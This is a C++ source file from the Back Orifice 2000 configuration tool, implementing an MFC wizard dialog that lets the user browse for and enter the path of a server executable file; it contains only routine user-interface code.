/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// Wizard2.cpp : implementation file
//

#include "stdafx.h"
#include "bo2kcfg.h"
#include "Wizard2.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CWizard2 dialog


CWizard2::CWizard2(CWnd* pParent /*=NULL*/)
	: CDialog(CWizard2::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWizard2)
	m_strServerFile = _T("");
	//}}AFX_DATA_INIT
}


void CWizard2::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWizard2)
	DDX_Text(pDX, IDC_SERVERFILE, m_strServerFile);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWizard2, CDialog)
	//{{AFX_MSG_MAP(CWizard2)
	ON_BN_CLICKED(IDBACK, OnBack)
	ON_BN_CLICKED(IDC_BROWSE, OnBrowse)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWizard2 message handlers

void CWizard2::OnBack() 
{
	EndDialog(IDBACK);	
}

void CWizard2::OnBrowse() 
{
	CFileDialog cfd(TRUE,".exe",NULL,OFN_FILEMUSTEXIST|OFN_HIDEREADONLY,"Executable Files (*.exe)|*.exe|All Files (*.*)|*.*||",this); 
	
	if(cfd.DoModal()==IDOK) {
		SetDlgItemText(IDC_SERVERFILE,cfd.GetPathName());
	}	
}
